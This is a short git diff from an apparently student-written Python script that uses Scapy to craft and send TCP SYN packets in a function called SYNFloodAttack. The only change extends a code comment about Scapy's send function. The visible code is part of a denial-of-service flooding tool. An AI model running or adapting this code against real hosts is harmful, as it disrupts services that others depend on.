@@ -25,7 +25,7 @@ def SYNFloodAttack(target_ip, source_port, destination_port):
     packet_ip=IP(src= Src_ip , dst= Dest_ip)
     packet_syn=TCP(sport =source_port, dport=destination_port, seq= 1505066, flags="S")
     thepacket = packet_ip/packet_syn
-    #the send function Sends packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.
+    #the send function Sends packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.It is a method from the Scapy Library.
     send(thepacket)
 #ghida's part
 #We call the synFloodAttack()function 
